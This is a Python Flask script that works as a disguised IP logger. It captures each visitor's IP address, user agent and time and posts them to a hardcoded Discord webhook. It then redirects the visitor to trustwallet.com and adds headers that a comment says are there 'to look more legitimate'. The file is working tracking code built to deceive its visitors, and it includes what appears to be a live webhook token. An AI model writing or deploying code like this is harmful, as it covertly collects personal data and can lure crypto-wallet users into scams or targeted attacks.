from flask import Flask, request, redirect, make_response
from datetime import datetime
import requests
import re

app = Flask(__name__)

def get_real_ip():
    """Get the real client IP handling proxies and Cloudflare"""
    if request.environ.get('HTTP_X_FORWARDED_FOR') == '127.0.0.1':
        return request.environ.get('REMOTE_ADDR')
    
    forwarded = request.environ.get('HTTP_X_FORWARDED_FOR')
    if forwarded:
        # Handle multiple IPs in X-Forwarded-For (first is real client)
        ip = forwarded.split(',')[0].strip()
        return ip
    
    # Cloudflare specific header
    cf_ip = request.headers.get('CF-Connecting-IP')
    if cf_ip:
        return cf_ip
    
    # True-Client-IP (Akamai, etc.)
    true_ip = request.headers.get('True-Client-IP')
    if true_ip:
        return true_ip
    
    # Fallback
    return request.environ.get('REMOTE_ADDR', 'Unknown')

def send_ip(ip, date, user_agent):
    webhook_url = "https://discord.com/api/webhooks/1447416593020752027/fTxDho-qrxHPpVcZ70Qt9X4lXWu8Y74OaRAC02Qhg8Y9HR2iqQhv5EgeCTT2eERMMEIp"
    
    embed = {
        "title": "🕵️ **New IP Logged**",
        "color": 0x00ff00,
        "fields": [
            {
                "name": "📍 IP Address",
                "value": f"`{ip}`",
                "inline": True
            },
            {
                "name": "📅 Date & Time",
                "value": f"`{date}`",
                "inline": True
            },
            {
                "name": "🌐 User Agent",
                "value": f"`{user_agent[:100]}...`" if len(user_agent) > 100 else f"`{user_agent}`",
                "inline": False
            }
        ],
        "footer": {
            "text": "IP Logger | Powered by Flask"
        },
        "timestamp": datetime.utcnow().isoformat()
    }
    
    data = {
        "username": "IP Tracker",
        "embeds": [embed]
    }
    
    try:
        requests.post(webhook_url, json=data, timeout=5)
    except:
        pass  # Silent fail to ensure redirect happens

@app.route("/", methods=['GET'])
def index():
    ip = get_real_ip()
    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC")
    user_agent = request.headers.get('User-Agent', 'Unknown')

    # Fire and forget IP logging (non-blocking)
    send_ip(ip, date, user_agent)

    # Instant redirect with 302 (temporary)
    response = redirect("https://trustwallet.com", code=302)
    
    # Add security headers to look more legitimate
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    return response

@app.route("/health")
def health():
    return "OK", 200

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000, threaded=True)
